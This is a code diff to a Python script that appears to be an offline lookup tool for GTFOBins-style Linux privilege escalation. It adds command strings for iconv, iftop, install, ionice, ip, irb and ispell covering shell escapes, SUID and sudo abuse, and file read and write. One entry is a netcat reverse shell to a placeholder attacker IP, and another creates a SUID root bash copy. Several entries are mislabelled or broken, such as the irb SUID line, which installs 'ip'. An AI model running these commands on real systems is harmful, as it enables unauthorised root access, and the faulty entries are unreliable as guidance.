@@ -1803,7 +1803,89 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "file-read":
             bins.append("hping3 -d $(wc -c < file.txt) -S -p 80 --data ""$(cat file.txt)"" target_ip")
 
+    elif zip_command == "iconv":
+        if zip_options == "file-write":
+            bins.append("LFILE=file_to_write\necho ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\niconv -f 8859_1 -t 8859_1 ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which iconv) .\nLFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 ""$LFILE""")
+        elif zip_options == "sudo":
+            bins.append("sudo LFILE=file_to_write\necho ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""")
+        elif zip_options == "Shell":
+            bins.append("iconv -f utf-8 -t utf-8 <<< ""$(bash)""")
 
+    elif zip_command == "iftop":
+        if zip_options == "Shell":
+            bins.append("iftop\n!/bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo iftop\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which iftop) .\n./iftop\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("iftop -t -s 1 -L 10 -i /path/to/file")
+        elif zip_options == "file-write":
+            bins.append("iftop -t -s 10 -L 20 > /path/to/output_file.txt")
+
+    elif zip_command == "install":
+        if zip_options == "suid":
+            bins.append("sudo install -m =xs $(which install) .\nLFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF")
+        elif zip_options == "sudo":
+            bins.append("LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF")
+        elif zip_options == "Shell":
+            bins.append("install -o root -g root -m 4755 /bin/bash /tmp/bash")
+        elif zip_options == "file-read":
+            bins.append("install -m 644 /path/to/restricted_file /tmp/copied_file")
+        elif zip_options == "file-write":
+            bins.append("install -m 644 /path/to/source_file /path/to/target_file")
+
+    elif zip_command == "ionice":
+        if zip_options == "Shell":
+            bins.append("ionice /bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ionice) .\n./ionice /bin/sh -p")
+        elif zip_options == "sudo":
+            bins.append("sudo ionice /bin/sh")
+        elif zip_options == "file-write":
+            bins.append("ionice -c2 -n7 echo ""DATA"" > /path/to/target_file")
+        elif zip_options == "file-read":
+            bins.append("ionice -c2 -n7 cat /path/to/target_file")
+
+    elif zip_command == "ip":
+        if zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nip -force -batch ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ip) .\nLFILE=file_to_read\n./ip -force -batch ""$LFILE""")
+        elif zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo ip -force -batch ""$LFILE""")
+        elif zip_options == "file-write":
+            bins.append("ip link show | tee /path/to/link_status.log")
+        elif zip_options == "Shell":
+            bins.append("ip addr show | nc <attacker_ip> 4444 -e /bin/bash")
+
+    elif zip_command == "irb":
+        if zip_options == "Shell":
+            bins.append("irb\nexec '/bin/bash'")
+        elif zip_options == "file-write":
+            bins.append("irb\nFile.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }")
+        elif zip_options == "file-read":
+            bins.append("irb\nputs File.read(""file_to_read"")")
+        elif zip_options == "sudo":
+            bins.append("sudo irb\nexec '/bin/bash'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ip) .\n./irb\nexec '/bin/bash'")
+
+    elif zip_command == "ispell":
+        if zip_options == "Shell":
+            bins.append("ispell /etc/passwd\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ispell) .\n./ispell /etc/passwd\n!/bin/sh -p")
+        elif zip_options == "sudo":
+            bins.append("sudo ispell /etc/passwd\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("ispell /path/to/file.txt")
+        elif zip_options == "file-write":
+            bins.append("ispell -b /path/to/input_file.txt > /path/to/output_file.txt")
 
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
@@ -1820,7 +1902,7 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "gawk" or start == "gcloud" or start == "gcore" or start == "gdb" or start == "gem" or start == "genie" or start == "genisoimage" or start == "ghc" or start == "ghci" or start == "gimp" or start == "ginsh" or start == "git" or start == "grc" or start == "grep" or start == "gtester" or start == "gzip" or start == "hd" or start == "head" or start == "hexdump" or start == "highlight" or start == "hping3" or start == "other":  
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "gawk" or start == "gcloud" or start == "gcore" or start == "gdb" or start == "gem" or start == "genie" or start == "genisoimage" or start == "ghc" or start == "ghci" or start == "gimp" or start == "ginsh" or start == "git" or start == "grc" or start == "grep" or start == "gtester" or start == "gzip" or start == "hd" or start == "head" or start == "hexdump" or start == "highlight" or start == "hping3" or start == "iconv" or start == "iftop" or start == "install" or start == "ionice" or start == "ip" or start == "irb" or start == "ispell" or start == "other":  
         zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
